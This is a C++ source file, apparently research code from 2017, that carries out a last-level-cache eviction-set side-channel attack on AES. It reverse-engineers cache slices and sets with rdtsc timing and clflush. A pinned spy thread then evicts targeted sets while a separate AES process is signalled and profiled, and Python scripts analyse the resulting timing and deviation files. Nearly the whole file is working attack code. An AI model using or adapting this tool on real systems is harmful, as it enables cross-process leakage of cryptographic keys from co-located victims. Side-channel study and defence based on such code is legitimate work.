/*
      -------------  Thank you Father, Jesus and Holy Spirit  ----------
	    ---------------  Thank you Holy Trinity  ------------
	    
Author: @ D Anthony Balaraju 	
						Edited On: MAY 19, 2017 

g++ -pthread --static Spyv5.cc -o Spyv5 -std=c++11
taskset -c 3 ./Spyv5 5 0 15 0 3
*/

#include <fstream>
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>
#include <algorithm>
#include <sched.h>
#include <vector>
#include <cassert>
#include <signal.h>
#include <math.h> 
#include <thread>
#include <sched.h>
#include <pthread.h>
#include <time.h>
#include <chrono>
#include <ctime>

unsigned cache_sz, buffer_size; 
unsigned num_ways;
unsigned num_sets, num_slices, sets_per_slice, set_index_bits ;
unsigned max_conflict_lines_required;
unsigned max_cache_access_latency, min_dram_access_latency;
unsigned tag_bits, align_shiftBits;

void checkIsEvictedFromSet(int setNumber, int tag);
void computeGeneralizedEvictionSetFromExisting(std::vector<long long int> (&evictionSetForTarget)[6][16], int sliceNum, int numSets);
void computeESForAllSlices(std::vector<long long int> (&evictionSetForTarget)[16], int setNumber , int tag );
bool checkEvictionSetExist(std::vector<long long int> *evictionSetForTarget, int i);
void computeEvictionSetForTargetAddress(long long int s_start, long long int targetAddress, unsigned int setNumber);
void constructSuperSetOfEvictionSet(long long int s_start, long long int targetAddress, unsigned int setNumber);
void removeUnnecessaryFromEvictionSet(long long int targetAddress, int samples);
bool iSEvicted (long long int targetAddress, int samples);
inline static void flushSet();
void printevictionSet();
static __inline__ unsigned long long rdtsc(void);
void clflush(void *addr);

void spyThread();
void aesProfileThread();

std::vector<long long int> evictionSet;
long long int start,end;
long long int s_start,v_start;
std::vector<long long int> evictionSetForAllSlices[16];	
int setNumberOfL1;	
volatile int startTag; //min value is 0  
volatile int endTag; //max value 31
volatile int startSlice; //min value is 0  
volatile int endSlice; //max value 7
bool runSpy=true;

pthread_t aes,spy;
int learningFlag=0;
int fileNameSuffix;
int thresholdForEnc16 = 30;
int learnCost;
//Paramters for AES
int startPower, endPower, numOfProfiles;
char profileFileName[30]="timing";
volatile int received = 0;
int pid,length,expo;//length for number of sets
int i_count=0;// will help in numbering of deviation files
using namespace std::chrono;
auto tic = high_resolution_clock::now();
auto toc = high_resolution_clock::now();
long long int toe;


void my_handler(int temp)
{
  received = 1;
}

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::shared_ptr<FILE> pipe(popen(cmd, "r"), pclose);
    if (!pipe) throw std::runtime_error("popen() failed!");
    while (!feof(pipe.get())) {
        if (fgets(buffer.data(), 128, pipe.get()) != NULL)
            result += buffer.data();
    }
    return result;
}

void intHandler (int temp)
{
 /* printf("Enter L1 set number:");
  scanf("%d",&setNumberOfL1);  
  if(setNumberOfL1 == -1)
  {
    kill(pid, SIGTERM); 
    runSpy=false;    
  }*/
  printf("Enter start and endTags:");
  scanf("%d",&startTag);
  if(startTag== -1)
  {
    kill(pid, SIGTERM); 
    runSpy=false;    
  }
  scanf("%d",&endTag);
  /*printf("Enter start and end slice numbers (0-3):");
  scanf("%d",&startSlice);
  scanf("%d",&endSlice);  */
  //printf("Changed!!PHASE SHIFT!!... Acessing %d sets ...\n", numberOfSets);
  printf("Changed!!PHASE SHIFT!!... StartTag %d EndTag %d...\n", startTag,endTag);    
  printf("StartSlice %d EndSlice %d...\n", startSlice,endSlice);    
  
  //for(int times=0;times<20;times++)
 
      char cmd[100];  
      for(int k=1;k<=4;k++)
      {
	kill(pid, SIGUSR2);
	while(!received); 
	received = 0;
	//sprintf(cmd,"cp ./DataFiles/deviationprofile1_17.txt %d_%d",40,k);
	sprintf(cmd,"cp ./DataFiles/deviationprofile1_%d.txt %d_%d",expo,99,k);
	system(cmd);
	sprintf(cmd,"cp %d_%d ./Deviation_profiles_%d_%d/%d_%d" ,99,k,expo,length,length,k+(4*i_count));
	system(cmd);
	sprintf(cmd,"cp ./TimingFiles/deviationprofile1_%d.txt ./Timing_profiles_%d_%d/%d_%d",expo,expo,length,length,k+(4*i_count));
	system(cmd);
	//sprintf(cmd,"cp ./TimingFiles/deviationprofile1_17.txt ./Timing_profiles/%d_%d",length,k+(4*i_count));
	//system(cmd);	
      }
	i_count+=1;
      //sprintf(cmd,"python groupSumAsDistinguisher.py %d %d",32,32);
      sprintf(cmd,"python all3propertiesAsDistinguisher_v2.py %d %d %d %d",99,99,startTag, endTag);
      system(cmd);
  
	
}


void *spyThreadL1(void*)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(4, &set);	//core shoudl be same as that of AES, if AES on 0, it should be on 4
    if(sched_setaffinity(0, sizeof(set), &set) < 0)
    {
      perror("affinity error...");
    }
	
    long long int temp_0,temp_1,y_start,y;
    int otherSetNum = (setNumberOfL1+16)%64;
    y_start = (s_start >> 12) & 7; //to get the next 3 bits
    while (runSpy)
    {        
        y = y_start;
        int ways = 8;
        while(ways > 0)
        {        
            __asm__ __volatile__(""); //So as to prevent compiler from optimizing 
            
            temp_0=((((( s_start >> 15 ) << 3 ) | y ) << 6 ) | setNumberOfL1 ) << 6;
            *(unsigned int*)temp_0 = ways;
            
	    temp_1=((((( s_start >> 15 ) << 3 ) | y ) << 6 ) | otherSetNum ) << 6;
            *(unsigned int*)temp_1 = ways;
		
	   //for(int k=0;k<1;k++)// Medium spy
	   //  __asm__ __volatile__("nop");
		
            y = (y+1)%8;
            ways--;
            
        }
    }
    
}


void *spyThread(void*)
{
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(2, &set);
	if(sched_setaffinity(0, sizeof(set), &set) < 0)
	{
	  perror("affinity error...");
	}
	while(runSpy)
	{
	  for(int MSB5bitsOfSetIndex=startTag; MSB5bitsOfSetIndex <= endTag; MSB5bitsOfSetIndex++ )
	  {	          
	      for(int slice=startSlice;slice<=endSlice;slice++)
	      {
		  for(int line=0; line<num_ways; line++)
		  {
		      *(unsigned int*)(evictionSetForAllSlices[slice][line] + ( ( (MSB5bitsOfSetIndex<<6) | setNumberOfL1) * 64) ) = 1;		  
		      *(unsigned int*)(evictionSetForAllSlices[slice][line] + ( ( (MSB5bitsOfSetIndex<<6) | setNumberOfL1) * 64) ) += 2;						    
		  }		
	      }
	  }
	}      
  
}

void createSPY_LLCThreadAndRun()
{
    	int rc ;
	void *status;
	rc = pthread_create(&spy, NULL, spyThread, NULL);
	if (rc){
	      printf( "Error:unable to create thread SPY,%d", rc );
	      exit(-1);
	}
}



void joinSPY_LLCWithMainThread()
{
    int rc ;
    void *status;
    rc = pthread_join(spy, &status);
    if (rc){
      printf( "Error:unable to join AES thread with Main thread,%d" , rc );
      exit(-1);
    } 
}


int main(int argc, char** argv) 
{   
     //--------------Initialization-------------------
    /*cache_sz = 20480*1024;
    num_ways = 20;
    num_sets = 16384	;
    num_slices = 8;*/
      
    // ------------BLoCK of Code : Reverse Engineering Part-----------
    {	
    cache_sz = 8192*1024;
    num_ways = 16;
    num_sets = 8192;
    num_slices = 4;
    
    sets_per_slice = num_sets / num_slices ;
    set_index_bits = log2(sets_per_slice);
    max_conflict_lines_required = num_slices * num_ways;
    buffer_size = cache_sz ;
    tag_bits = ceil(log2(max_conflict_lines_required));
    align_shiftBits = 6 + set_index_bits + tag_bits;

    max_cache_access_latency = 250;
    min_dram_access_latency = 330;
    printf("align_shiftBits %d  set_index_bits %d tag_bits %d\n",align_shiftBits, set_index_bits, tag_bits);
    //-------------------------------------------   
     
  
	unsigned int setNumber = 0; 
	// 2MB allocated    
	uint64_t memsize = 2*1024*1024;	    
	
	int *victim_array= (int *)mmap((void*)(1<<21), 8*memsize, PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS |MAP_POPULATE | MAP_HUGETLB , -1, 0);	    
	if (victim_array == MAP_FAILED) {
	  printf("mmap failed\n");
	  return 0;
	}
	
	int *spy_array= (int *)mmap((void*)(3<<(align_shiftBits+1)), (cache_sz*2), PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS |MAP_POPULATE | MAP_HUGETLB , -1, 0);	      
	if (spy_array == MAP_FAILED) {
	  printf("mmap failed\n");
	  return 0;
	}	
	
	long long int targetAddress;
	
	s_start=(long long int)spy_array;        
	v_start=(long long int)victim_array;	

	std::vector<long long int> evictionSetForTarget[6][16];	
	int i,j;
	
	
	for(int sliceNum=0; sliceNum<num_slices; sliceNum++)
	{
	  int setNumber=0;
	  computeESForAllSlices(evictionSetForTarget[setNumber], setNumber, sliceNum);
	  setNumber++;
	  do
	  {
	    //add one more set
	    computeESForAllSlices(evictionSetForTarget[setNumber], setNumber, sliceNum);
	    //validate eviction set is perfect or not...
	    computeGeneralizedEvictionSetFromExisting(evictionSetForTarget,sliceNum, setNumber);
	    setNumber ++;
	    //printf("%d \n", evictionSetForAllSlices[sliceNum].size() );
	  }while(evictionSetForAllSlices[sliceNum].size() < num_ways ); // not perfect
	  printf("Now slice %d finished\n", sliceNum);
	}
	
	printf("\n-------CHECKING THE VALIDITY OF KNOWN EVICTION SETS FOR THE KNOWN CAHCE SETS-------\n");
	for(int i=0;i<8;i++)
	{	
	  checkIsEvictedFromSet(setNumber+i,i);
	} 
	
	printf("**Computing the Eviction sets for the L1 sets of AES...\n");
	
	
	setNumberOfL1= atoi(argv[1]);
	startTag= atoi(argv[2]); //min value is 0  
	endTag= atoi(argv[3]); //max value is 31
	startSlice= atoi(argv[4]); //min value is 0  
	endSlice= atoi(argv[5]); //max value is 3
	length=atoi(argv[7]);
	expo=atoi(argv[6]);
	
	printf("\n\nAll RIGHT ..Get set ready\n\n Started Evicting  %d \n", setNumberOfL1);	
	
    }
    //------ Fninihsed reverse engg part..--------------------
    
    signal(SIGINT, intHandler);
    signal(SIGUSR1, my_handler);
    
    //change1:not required..
    //system("make AESProfiles"); 
   
    int rc ; 
    void *status;
    //--------1. CREATE SPY---------
    createSPY_LLCThreadAndRun();
    pid=std::stoi(exec("pgrep main"));
    startSlice = 0;
    endSlice =3;
   
    //------------Linear Prune--------------------
    float Entropies[32];
    system("rm avgRank_variation");
   // FILE *fnew=fopen("Testing","a");	
  /*    for(int q=0; q<64; q++)
      {    
	for(int set=0;set<32;set++)
	  {      
	    startTag = endTag = set;
		      
	  // fprintf (fnew, “s= %d   e= %d”, startTag, endTag);
	    //printf("startTag %d , endtag %d :", startTag, endTag);
	    char cmd[50];
	      
	    
	    for(int k=1;k<=4;k++)
	    {
	      kill(pid, SIGUSR1);
	      while(!received); 
	      received = 0;
	      //sprintf(cmd,"cp ./DataFiles/deviationprofile1_17.txt %d_%d",set,k);
	      sprintf(cmd,"cp ./DataFiles/deviationprofile1_%d.txt %d_%d",expo,set,k);
	      system(cmd);	
	    }
	  //sprintf(cmd,"python groupSumAsDistinguisher.py %d %d",set,set);
	  sprintf(cmd,"python all3propertiesAsDistinguisher_v2.py %d %d %d %d", set, set, startTag, endTag);
	    system(cmd);	              
	    
	  }   
	  if(setNumberOfL1< 63)
	  {
	  setNumberOfL1++;
	  printf("\n\n\n Started Evicting setNumberOfL1  %d \n", setNumberOfL1);
	  
	  }
      }*/



	//fclose(fnew);
//--------------for storing files------------------------------
 tic =high_resolution_clock::now();
  while(length<2)
    {	 int x;
	for(int q=0; q<64; q++)
	  {  
	      float y;
	      y=(ceil((float)32/(float)length));
	    //  for(int p=1; p<=length; p++)
	      {
	      for(int set=0;set<32;set=set +length)
		  {      
		      startTag = set;
		      if(startTag+length-1<32)
			      endTag = startTag+length-1;
		      else
			      endTag=31;
		  // printf("startTag %d , endtag %d :", startTag, endTag);
		    char cmd[100];
		      
		    
		    for(int k=1;k<=4;k++)
		    {
		      kill(pid, SIGUSR1);
		      while(!received); 
		      received = 0;
		      //sprintf(cmd,"cp ./DataFiles/deviationprofile1_17.txt %d_%d",set,k);
		      sprintf(cmd,"cp ./DataFiles/deviationprofile1_%d.txt %d_%d",expo,set+32,k);
		      system(cmd);	
		      sprintf(cmd,"cp %d_%d ./Deviation_profiles_%d_%d/%d_%d" ,set+32,k,expo,length,length,k+(4*i_count));
		      system(cmd);
		      sprintf(cmd,"cp ./TimingFiles/deviationprofile1_%d.txt ./Timing_profiles_%d_%d/%d_%d",expo,expo,length,length,k+(4*i_count));
		      system(cmd);	
		    }
		      i_count+=1;
		  //sprintf(cmd,"python groupSumAsDistinguisher.py %d %d",set,set);
		    if(x%(int)y==0)
		    {
			sprintf(cmd,"python all3propertiesAsDistinguisher_v2.py %d %d %d %d %d %d",set+32,set+32,startTag, endTag, x/(int)y,1);
			system(cmd);
		    }
		    else
		    {
			  sprintf(cmd,"python all3propertiesAsDistinguisher_v2.py %d %d %d %d %d %d",set+32,set+32,startTag, endTag, x/(int)y,0);
			  system(cmd);
			      
		    } x++;
		      
			
		  }  
	      }
	      if(setNumberOfL1<63)
		{ 
		  setNumberOfL1++;
		  printf(" \n Started SPYINGGG (evicting) :P  %d \n", setNumberOfL1);
		  printf("\n");
		}
	      
	  }
	  setNumberOfL1=0;
	  length++;
	  x=0;
	  printf("\nFor length= %d\n", length);
	  printf(" \n Started Evicting %d \n", setNumberOfL1);
    }
    
    toc =high_resolution_clock::now();
	  toe =std::chrono::duration_cast<std::chrono::seconds>(toc-tic).count();
	  printf("Total time is %lld", toe);
    exit(0);
//----------------------------------------------------------------------  
    
    //printf("\nNow let me process all the profiling files...to find out the best set....\n\n");    
    
  //kill(pid, SIGTERM); 
  //runSpy=false;
//-----------------------------------------------------------------------
//rename(Testing, )



//-----------------------------------------------------------------------
  joinSPY_LLCWithMainThread();
  
}//end of main


void checkIsEvictedFromSet(int setNumber, int tag)
{
      long long int targetAddress;    
      std::vector<long long int> evictionSetForUnknown[16]; 
      for(int slice=0;slice<num_slices;slice++)
      {
	//CHANGE
	//for(int line=0; line<16;line++)
	for(int line=0; line<evictionSetForAllSlices[slice].size();line++)
	{
	  evictionSetForUnknown[slice].push_back( evictionSetForAllSlices[slice][line]+ (setNumber*64) );      
	  //printf("%lld ",evictionSetForUnknown[slice][line]);
	}
      }
      //targetAddress=((((( v_start >> 21 ) << 4 ) | tag ) << 11 ) | setNumber ) << 6;      
      targetAddress=((((( v_start >> 21 ) << (15-set_index_bits) ) | tag ) << set_index_bits ) | setNumber ) << 6;                   
      printf("\nTarget %llx SetNumber %d Tag=%d \n",targetAddress, setNumber, tag );
      for(int slice=0;slice<num_slices;slice++)
      {
	evictionSet.clear();
	evictionSet=evictionSetForUnknown[slice];      
	printf("slice %d ",slice);
	for(int times=0;times<5;times++)
	{	
	    if(iSEvicted(targetAddress, 20000)==true)  	    printf("Yes."); 	    
	    //else  	    printf("No.");	    	    	  
	}
	printf("\t");
      }              
      printf("\n");
}

void computeGeneralizedEvictionSetFromExisting(std::vector<long long int> (&evictionSetForTarget)[6][16], int sliceNum, int numSets)
{
  std::vector<long long int> vectorSplit[2][6][16]; //0th one for tags, 1st one is for cacheline offsets
  int size,k,i;  
  long long int value;
      for(int set=0;set<=numSets;set++)
      {
	  // 3 sets; 4 lines(eviction sets) each for each set
	  //CHANGE:TODO
	    size=evictionSetForTarget[set][sliceNum].size();	   
	    for(i=0;i<size;i++)
	    {	      
	      value=evictionSetForTarget[set][sliceNum][i];	      
	      //Tag part
	      vectorSplit[0][set][sliceNum].push_back(value&(~0x1ffff));	      	      //2048sets* 64B =2^17
	      //Line part
	      vectorSplit[1][set][sliceNum].push_back(value&0x1ffff);	      	      
	    }	    	  
      }
      
      std::vector<long long int> generalizedES, finalTags;      
      std::vector<long long int> finalSets[6][16];   
    
      // all the 4 vectors(slices) of each set
      //for(int slice=0;slice<num_slices;slice++)
      {
	  //TAG PARTS ONLY
	  //club all the three vectors(of 3 sets) into same vector then sort it
	 
	  //0th vector of all sets
	  for(int set=0;set<=numSets;set++)
	  {
	    for(int ele=0;ele<vectorSplit[0][set][sliceNum].size();ele++)
	    {
	      generalizedES.push_back(vectorSplit[0][set][sliceNum][ele]);
	    }
	  }
	  
	  std::sort(generalizedES.begin(), generalizedES.end());
	  
	  for(int ele=0;ele<generalizedES.size();ele++)
	  {
	    /*if(generalizedES[ele]==generalizedES[ele+1])
	    { 
	      //std::cout<< generalizedES[ele] <<" "; 
	      finalTags.push_back(generalizedES[ele]);
	      ele++;
	      if(generalizedES[ele]==generalizedES[ele+1])
		ele++;       
	    }*/
	    int inc=0;
	    for(int lookahead=5;lookahead>=1;lookahead--)
	    {
	    
	      if(ele+lookahead <generalizedES.size() && generalizedES[ele] == generalizedES[ele+lookahead])
	      {
		inc=lookahead;
		break;
	      }     	      
	    }  	    
	    if(inc!=0)
	      finalTags.push_back(generalizedES[ele]);
	    ele+= inc;
	  }

	  for(int setNum=0; setNum<=numSets; setNum++)
	  {
	      printf("SetNum %d Eviction set of Slice- %d: ",setNum,sliceNum);
	     //Cache line field of 0th vector of first set   
	      long long int lineBits = vectorSplit[1][setNum][sliceNum][0];
	      printf("%d ",(int)finalTags.size());
	      for(int i=0; i<finalTags.size();i++)
	      {
		finalSets[setNum][sliceNum].push_back(finalTags[i]|lineBits);
		//printf("%lld ",finalSets[setNum][sliceNum][i]);
	      }
	      printf("\n");
	  }
	  printf("\n");
	  
	  generalizedES.clear();
	  finalTags.clear();
      }
      //for(int slice=0;slice<num_slices;slice++)
	evictionSetForAllSlices[sliceNum] = finalSets[0][sliceNum];
	//printf("%d \n", evictionSetForAllSlices[sliceNum].size() );
      for(int set=0;set<6;set++)
      {
	    for(int slice=0;slice<16;slice++)
	    {
	      vectorSplit[0][set][slice].clear();
	      vectorSplit[1][set][slice].clear();
	      finalSets[set][slice].clear();
	    }
      }
}    

// sliceNum = tag here...
void computeESForAllSlices(std::vector<long long int> (&evictionSetForTarget)[16], int setNumber , int tag )
{
	long long int targetAddress;
	evictionSet.clear();		
	//targetAddress=((((( v_start >> 21 ) << 4 ) | tag ) << 11 ) | setNumber ) << 6;   
	targetAddress=((((( v_start >> 21 ) << (15-set_index_bits) ) | tag ) << set_index_bits ) | setNumber ) << 6;                   
	printf("Target Address %llx SetNumber %d Tag %d\n",targetAddress, setNumber, tag);
	computeEvictionSetForTargetAddress(s_start, targetAddress,setNumber);	  
	// first slice means nothing is there already in evictionSetForTarget array...
	//if(tag==0 || (checkEvictionSetExist(evictionSetForTarget,tag)==false))
	  evictionSetForTarget[tag] = evictionSet;	    
	printf("\n---------------------------------------\n");    		  
}



// if the current eviction set is equal to any of the exisitng evicition sets then returns true, if not false
bool checkEvictionSetExist(std::vector<long long int> *evictionSetForTarget, int i)
{
  //printf("Checking its already exisiting or not,...");
  for(int j=0;j<i;j++)
  {
    if(evictionSetForTarget[j]==evictionSet)
    {
      printf("Current ES is present already in ES[%d]\n",j);
      return true;
    }
    if (std::includes(evictionSetForTarget[j].begin(), evictionSetForTarget[j].end(), evictionSet.begin(), evictionSet.end()) ||
      std::includes(evictionSet.begin(), evictionSet.end(), evictionSetForTarget[j].begin(), evictionSetForTarget[j].end()) )
    {
      printf("One ES is subset of the other ES[%d]\n",j);
      if(evictionSetForTarget[j].size() < evictionSet.size())
      {
	printf("Current ES is superset of the other ES[%d]\n",j);
	evictionSetForTarget[j].clear();
	evictionSetForTarget[j]=evictionSet;
      }
      else{
	printf("Current ES is subset of the other ES[%d]\n",j);		
      }
	
      return true;
    }
  }
  return false;  
}

void computeEvictionSetForTargetAddress(long long int s_start, long long int targetAddress, unsigned int setNumber)
{
	//printf("Target Address %llx SetNumber %d \n",targetAddress, setNumber);
	// STEP1	
	constructSuperSetOfEvictionSet(s_start, targetAddress,setNumber );
	/*printf("Confirm??");
	if(iSEvicted(targetAddress, 400000)==true)
	  printf("Yes\n");
	else
	  printf("No\n");	
	*/
	// STEP2:------------------------
	//printf("Eviction set size before removing unnecessary lines is %ld; \n",evictionSet.size());		
	//printf("Removing unnecessary lines...");	
	removeUnnecessaryFromEvictionSet(targetAddress,20000);
	printf("After removal size of eviction set is : %ld\t", evictionSet.size());	
	printf("CHeCK? ");	
	for(int i=0;i<5;i++)
	{
	  if(iSEvicted(targetAddress, 20000)==true)  	    printf("Yes."); 	    
	  else  	    printf("No.");	    	    	  
	}	
	//ADDED
	if(evictionSet.size()<=num_ways)
	  return;
	
	printf("\nOptimize further ? ");
	removeUnnecessaryFromEvictionSet(targetAddress,20000);
	int timesRun=0;
	while(evictionSet.size()>num_ways*3/2)
	{
	  //sleep(1);
	  printf("Trying again to optimize the ES size\n");
	  removeUnnecessaryFromEvictionSet(targetAddress,20000);	  
	  printf(" Size is : %ld\t", evictionSet.size());	
	  if(timesRun++>15)
	  {
	    printf("Something wrong.. I cant optimize further,..Exiting..\n");
	    exit(1);
	  }
	}
	printf(" Size is : %ld\t", evictionSet.size());	
	//printevictionSet();	
	printf("CHeCK ?  ");	
	for(int i=0;i<5;i++)
	{
	  flushSet(); clflush((void*)targetAddress);
	  if(iSEvicted(targetAddress, 20000)==true) 	    printf("Yes."); 	    
	  else 	    printf("No.");	    	    	  
	}
}

void constructSuperSetOfEvictionSet(long long int s_start, long long int targetAddress, unsigned int setNumber)
{	    
	    //CHANGE
	    long long int conflictingLine;	    
	    //for(int j=0; j<128 && evictionSet.size()!=64 ;j++)                   
	    for(int j=0; j<max_conflict_lines_required*5/4 && evictionSet.size()!=max_conflict_lines_required ;j++)                   
	    {
		// Add a conflicting line to the eviction set...Keep adding the lines till the the target eviction is observed
		// Max lines that can be added are 128 (though 64 are sufficient)
		//conflictingLine=((((( s_start >> 24 ) << 7 ) | j ) << 11 ) | setNumber ) << 6;    
	        conflictingLine=((((( s_start >> (align_shiftBits+1) ) << (tag_bits+1) ) | j ) << set_index_bits ) | setNumber ) << 6;    
		evictionSet.push_back(conflictingLine);
		
		if(evictionSet.size() < max_conflict_lines_required * 7 / 8)
		  continue;
		
		if(iSEvicted(targetAddress, 20000)==true)
		{
		  //printf("Address %llx...  Line %d..  Eviction happened by adding this line\n ",conflictingLine,j);
		  break;
		}	
	    }  
}
	
void removeUnnecessaryFromEvictionSet(long long int targetAddress, int samples)
{
	int i=1;
	int initialEvictionSetSize = evictionSet.size(); 
	for(int j=0;j<initialEvictionSetSize;j++)
	{
	    long long int x=evictionSet[evictionSet.size()-i]; 
	    evictionSet.erase(evictionSet.begin() + (evictionSet.size()-i) );
	    //printf("\n %llx is removed ", x);
	    //printf("set size is  %ld... \n",evictionSet.size());	
	    if(iSEvicted(targetAddress, samples)==false)
	    {
	      evictionSet.push_back(x);
	      //printf("\n %llx is added back\n", x);
	      i=i+1;
	    }
	} 
}


// Return true if the target is evicted by the current eviction set, else return false
bool iSEvicted (long long int targetAddress, int samples)
{
	int count=0;    
	for(int k=0;k<samples;k++)                   
	{
	    //---- 1. Access target line -------	    
	    *(unsigned int*)targetAddress = 1;	    
	    
	    //----- 2. Acess all elements of a eviction set -----
	    for(int i=0; i<evictionSet.size(); i++ )
	    {	  
		*(unsigned int*)(evictionSet[i]) = 1;		  
		*(unsigned int*)(evictionSet[i]) += 2;				
	    }
	    for(int i=evictionSet.size()-1; i>=0 ; i-- )
	    {	
		*(unsigned int*)(evictionSet[i]) = 1;		
		*(unsigned int*)(evictionSet[i]) += 2;
	    }	    
	    //----- 3. Access the target line again and measure the time taken to access it ----	    
	    start=rdtsc();  
	    *(unsigned int*)targetAddress = 1;    
	    end=rdtsc(); 
	    
	    // It is a hit in LLC
	    if((int)(end-start)<250) {
	      count++;
	    }
	    // It is a miss in LLC and hit in DRAM
	    else if((int)(end-start)>340 && (int)(end-start)<480)   {
	      count--;
	    }
	    // outliers--due to noise
	    else{
	    }
	}
	
	//--- Target is Not Evicted (Hit in LLC)
	if(count>0) 
	{   
	    return false;
	}
	//---Target Evicted (Miss in LLC)
	else{	  
	  return true;
	}
}


static __inline__ unsigned long long rdtsc(void)
{
	unsigned hi, lo;
	__asm__ __volatile__ ("xorl %%eax,%%eax\n cpuid \n" ::: "%eax", "%ebx", "%ecx", "%edx"); // flush pipeline
	__asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
	__asm__ __volatile__ ("xorl %%eax,%%eax\n cpuid \n" ::: "%eax", "%ebx", "%ecx", "%edx"); // flush pipeline
	return ( (unsigned long long)lo)|( ((unsigned long long)hi)<<32 );
}
    
void clflush(void *addr) 
{
  //asm volatile("mfence;");
  asm volatile("clflush (%0)" : : "r" (addr));
}


void printevictionSet()
{
    for(int i=0; i<evictionSet.size(); i++ )
    {	      
      //printf("%d %llx\t", i, evictionSet[i]);
      printf("%llx ",evictionSet[i]);
    }  
    printf("\n");
}


inline static void flushSet()
{
    //flush entire eviction set from the cache (hoping that it will help to deal with prefetching)
    for(int i=0; i<evictionSet.size(); i++ )
    {	      
      clflush((void*)evictionSet[i]);
    }  
}

